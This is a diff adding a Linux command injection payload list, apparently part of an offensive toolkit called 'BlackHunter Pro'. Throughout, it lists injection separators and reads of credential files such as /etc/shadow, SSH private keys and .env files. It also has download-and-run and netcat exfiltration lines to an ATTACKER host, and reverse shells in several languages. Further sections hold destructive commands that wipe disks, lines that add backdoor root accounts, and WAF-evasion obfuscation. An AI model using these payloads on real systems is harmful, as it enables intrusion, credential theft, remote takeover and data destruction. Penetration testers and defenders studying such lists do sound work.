@@ -1,0 +1,480 @@
+# payloads/cmdi/linux.txt
+# Linux Command Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# SEPARATORS
+# =============================================
+
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+%0aid
+%0did
+%0aid
+
+# =============================================
+# BASIC COMMANDS - WITH SEMICOLON
+# =============================================
+
+; whoami
+; uname -a
+; hostname
+; pwd
+; ls -la
+; ls -la /
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; cat /etc/hostname
+; cat /etc/issue
+; cat /proc/version
+; cat /proc/cpuinfo
+; ifconfig
+; ip a
+; netstat -an
+; ps aux
+; ps -ef
+; env
+; set
+; w
+; who
+; last
+; uptime
+; date
+; id
+; groups
+; whoami
+; uname -a
+
+# =============================================
+# BASIC COMMANDS - WITH PIPE
+# =============================================
+
+| whoami
+| uname -a
+| hostname
+| pwd
+| ls -la
+| ls -la /
+| cat /etc/passwd
+| cat /etc/shadow
+| cat /etc/hosts
+| ifconfig
+| ip a
+| netstat -an
+| ps aux
+| env
+| id
+
+# =============================================
+# BASIC COMMANDS - WITH AMPERSAND
+# =============================================
+
+& whoami
+& uname -a
+& hostname
+& pwd
+& ls -la
+& cat /etc/passwd
+& ifconfig
+& netstat -an
+& ps aux
+& id
+
+# =============================================
+# BASIC COMMANDS - WITH DOUBLE AMPERSAND
+# =============================================
+
+&& whoami
+&& uname -a
+&& hostname
+&& pwd
+&& ls -la
+&& cat /etc/passwd
+&& ifconfig
+&& netstat -an
+&& ps aux
+&& id
+
+# =============================================
+# BASIC COMMANDS - WITH DOUBLE PIPE
+# =============================================
+
+|| whoami
+|| uname -a
+|| hostname
+|| pwd
+|| ls -la
+|| cat /etc/passwd
+|| ifconfig
+|| netstat -an
+|| ps aux
+|| id
+
+# =============================================
+# BASIC COMMANDS - WITH BACKTICKS
+# =============================================
+
+`whoami`
+`uname -a`
+`hostname`
+`pwd`
+`ls -la`
+`cat /etc/passwd`
+`ifconfig`
+`netstat -an`
+`ps aux`
+`id`
+
+# =============================================
+# BASIC COMMANDS - WITH $()
+# =============================================
+
+$(whoami)
+$(uname -a)
+$(hostname)
+$(pwd)
+$(ls -la)
+$(cat /etc/passwd)
+$(ifconfig)
+$(netstat -an)
+$(ps aux)
+$(id)
+
+# =============================================
+# FILE READING
+# =============================================
+
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; cat /etc/hostname
+; cat /etc/issue
+; cat /etc/motd
+; cat /etc/resolv.conf
+; cat /etc/crontab
+; cat /etc/fstab
+; cat /etc/group
+; cat /etc/gshadow
+; cat /proc/version
+; cat /proc/cpuinfo
+; cat /proc/meminfo
+; cat /proc/self/environ
+; cat /proc/self/cmdline
+; cat /root/.bash_history
+; cat /root/.ssh/id_rsa
+; cat /root/.ssh/authorized_keys
+; cat /root/.my.cnf
+; cat /var/log/apache2/access.log
+; cat /var/log/apache2/error.log
+; cat /var/log/nginx/access.log
+; cat /var/log/nginx/error.log
+; cat /var/log/auth.log
+; cat /var/log/syslog
+; cat /var/www/html/config.php
+; cat /var/www/html/wp-config.php
+; cat /var/www/html/.env
+
+# =============================================
+# SYSTEM INFO
+# =============================================
+
+; uname -a
+; uname -r
+; uname -m
+; hostname
+; hostnamectl
+; cat /etc/os-release
+; cat /etc/lsb-release
+; cat /etc/debian_version
+; cat /etc/redhat-release
+; cat /etc/centos-release
+; lsb_release -a
+; uptime
+; date
+; whoami
+; id
+; groups
+; w
+; who
+; last
+; lastlog
+; env
+; set
+; printenv
+; ps aux
+; ps -ef
+; top -b -n 1
+; free -m
+; df -h
+; du -sh /var/www
+; lscpu
+; lspci
+; lsusb
+
+# =============================================
+# NETWORK INFO
+# =============================================
+
+; ifconfig
+; ifconfig -a
+; ip a
+; ip addr
+; ip route
+; route -n
+; netstat -an
+; netstat -tlnp
+; netstat -tulpn
+; ss -tlnp
+; ss -tulpn
+; ss -an
+; arp -a
+; ip neigh
+; cat /etc/resolv.conf
+; cat /etc/hosts
+; cat /etc/networks
+; hostname -I
+; hostname -i
+; wget -qO- ifconfig.me
+; curl ifconfig.me
+; curl ipinfo.io
+; curl ipinfo.io/ip
+
+# =============================================
+# USER INFO
+# =============================================
+
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/group
+; cat /etc/gshadow
+; cat /etc/sudoers
+; cat /etc/sudoers.d/*
+; w
+; who
+; last
+; lastlog
+; users
+; id
+; groups
+; finger
+; ls -la /home
+; ls -la /home/*
+; ls -la /root
+; ls -la /root/.ssh
+; find /home -name "*.ssh" -o -name "id_rsa" 2>/dev/null
+
+# =============================================
+# PROCESS INFO
+# =============================================
+
+; ps aux
+; ps -ef
+; ps -ef | grep root
+; ps -ef | grep apache
+; ps -ef | grep nginx
+; ps -ef | grep mysql
+; top -b -n 1
+; htop
+; pstree
+; systemctl list-units --type=service
+; service --status-all
+; chkconfig --list
+; ls -la /etc/init.d/
+; ls -la /etc/systemd/system/
+; cat /etc/crontab
+; crontab -l
+; ls -la /etc/cron*
+; atq
+
+# =============================================
+# FILE DISCOVERY
+# =============================================
+
+; ls -la
+; ls -la /
+; ls -la /etc
+; ls -la /var
+; ls -la /var/www
+; ls -la /var/www/html
+; ls -la /home
+; ls -la /root
+; ls -la /tmp
+; ls -la /dev
+; ls -la /proc
+; find / -name "*.conf" 2>/dev/null
+; find / -name "*.config" 2>/dev/null
+; find / -name "*.php" 2>/dev/null
+; find / -name "*.bak" 2>/dev/null
+; find / -name "*.backup" 2>/dev/null
+; find / -name "*.sql" 2>/dev/null
+; find / -name "*.db" 2>/dev/null
+; find / -name "*.log" 2>/dev/null
+; find / -name "id_rsa" 2>/dev/null
+; find / -name ".env" 2>/dev/null
+; find / -name "wp-config.php" 2>/dev/null
+; find / -name "config.php" 2>/dev/null
+; find / -perm -4000 2>/dev/null
+; find / -perm -2000 2>/dev/null
+; find / -writable 2>/dev/null
+
+# =============================================
+# GREP FOR SENSITIVE DATA
+# =============================================
+
+; grep -r "password" /var/www 2>/dev/null
+; grep -r "password" /var/www/html 2>/dev/null
+; grep -r "passwd" /var/www 2>/dev/null
+; grep -r "user" /var/www/html/config.php 2>/dev/null
+; grep -r "DB_PASSWORD" /var/www 2>/dev/null
+; grep -r "DB_USER" /var/www 2>/dev/null
+; grep -r "mysql" /var/www/html 2>/dev/null
+; grep -r "api_key" /var/www 2>/dev/null
+; grep -r "secret" /var/www 2>/dev/null
+; grep -r "token" /var/www 2>/dev/null
+
+# =============================================
+# FILE TRANSFER
+# =============================================
+
+; wget http://ATTACKER/shell.sh -O /tmp/shell.sh
+; wget http://ATTACKER/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+; curl http://ATTACKER/shell.sh -o /tmp/shell.sh
+; curl -s http://ATTACKER/shell.sh | bash
+; curl -s http://ATTACKER/shell.sh | sh
+; wget -qO- http://ATTACKER/shell.sh | bash
+; wget -qO- http://ATTACKER/shell.sh | sh
+; nc ATTACKER 4444 < /etc/passwd
+; cat /etc/passwd | nc ATTACKER 4444
+; scp /etc/passwd user@ATTACKER:/tmp/
+; rsync -avz /etc/passwd user@ATTACKER:/tmp/
+
+# =============================================
+# REVERSE SHELLS
+# =============================================
+
+; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
+; 0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196
+; nc -e /bin/sh ATTACKER 4444
+; nc -c /bin/sh ATTACKER 4444
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+; php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+; ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
+
+# =============================================
+# DANGEROUS COMMANDS
+# =============================================
+
+; rm -rf /
+; rm -rf /*
+; rm -rf /var/www
+; rm -rf /etc
+; shutdown -h now
+; reboot
+; init 0
+; init 6
+; kill -9 1
+; killall -9 apache2
+; killall -9 nginx
+; killall -9 mysql
+; dd if=/dev/zero of=/dev/sda
+; mkfs.ext4 /dev/sda
+; echo "" > /etc/passwd
+; echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd
+; echo "hacker:password" | chpasswd
+; useradd -m -s /bin/bash hacker
+; useradd -m -g root -G sudo -s /bin/bash hacker
+
+# =============================================
+# WAF BYPASS TECHNIQUES
+# =============================================
+
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat${IFS}$1/etc/passwd
+;ls${IFS}-la
+;cat%09/etc/passwd
+;cat	/etc/passwd
+;cat%0a/etc/passwd
+;cat%0d/etc/passwd
+;cat%0d%0a/etc/passwd
+;cat</etc/passwd
+;cat<>/etc/passwd
+;cat$IFS$9/etc/passwd
+;a=cat;b=/etc/passwd;$a $b
+;A=cat;B=/etc/passwd;$A $B
+;x=id;$x
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;c\at /etc/passwd
+;ca\t /etc/passwd
+;wh'o'ami
+;w"h"o"a"m"i
+;c?t /etc/passwd
+;cat /etc/pass*
+;cat /e??/p?????
+;cat /etc/p*sswd
+;cat /e*c/p*sswd
+;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+;echo 636174202f6574632f706173737764 | xxd -r -p | sh
+;$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')
+;eval$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+;bash -c 'cat /etc/passwd'
+;sh -c 'cat /etc/passwd'
+;python -c 'print(open("/etc/passwd").read())'
+;perl -e 'print `cat /etc/passwd`'
+
+# =============================================
+# COMMAND SUBSTITUTION
+# =============================================
+
+`cat /etc/passwd`
+$(cat /etc/passwd)
+`id`
+$(id)
+`whoami`
+$(whoami)
+`uname -a`
+$(uname -a)
+
+# =============================================
+# SPECIAL CHARACTERS
+# =============================================
+
+%0aid
+%0did
+%0auname -a
+%0acat /etc/passwd
+%0d%0aid
+%0d%0acat /etc/passwd
+%09id
+%09cat /etc/passwd
+%20id
+%20cat /etc/passwd
+%3bid
+%3bcat /etc/passwd
+
+# =============================================
+# COMMAND CHAINING
+# =============================================
+
+;id;whoami
+;id&&whoami
+;id||whoami
+;id|whoami
+;id&whoami
+;cat /etc/passwd;id
+;id;cat /etc/passwd
+;whoami;id;uname -a
+;ls -la;cat /etc/passwd
+;ifconfig;netstat -an;ps aux
